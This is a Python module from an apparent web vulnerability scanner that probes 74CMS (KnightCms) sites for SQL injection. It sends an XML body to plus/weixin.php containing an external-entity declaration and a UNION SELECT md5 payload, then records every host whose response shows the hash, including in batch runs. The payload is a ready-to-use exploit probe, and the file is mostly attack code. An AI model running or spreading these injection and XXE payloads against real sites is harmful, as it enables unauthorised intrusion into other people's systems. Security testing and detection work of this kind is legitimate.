import requests,re,urllib3
from hashlib import md5
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class KnightCmsSql2:
	def randomInt(self,s,e):
		import random
		key=random.randint(int(s),int(e))
		return key

	def scan(self,baseurl):
		if baseurl[-1]=='/':
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		rand = self.randomInt(200000000, 210000000)
		url=baseurl+"plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\xc3\x97tamp=&nonce="
		body='<?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%\' union select md5('+str(rand)+')#</Content></xml>'
		headers={"User-Agent": self.headers,'Content-Type': 'text/xml'}
		response=requests.post(url,body,headers=headers,timeout=5,verify=self.ssl,proxies=self.proxy)
		if md5(str(rand).encode()).hexdigest() in response.text:
			OutPrintInfo("74CMS", f"存在KnightCms-Sql: {baseurl}")
			if self.batch:
				OutPutFile("74cms_Sqli.txt", f"存在KnightCms-Sql: {baseurl}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "不存在KnightCms-Sql")
	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		if not self.batch:
			req = ReqSet(proxy=proxy)
			self.proxy = req["proxy"]

		else:
			self.proxy = {"http": proxy, "https": proxy}
		if not self.batch:
			OutPrintInfo("74CMS", "开始检测KnightCms-Sql...")
		self.scan(url)
		if not self.batch:
			OutPrintInfo("74CMS", "KnightCms-Sql检测结束")
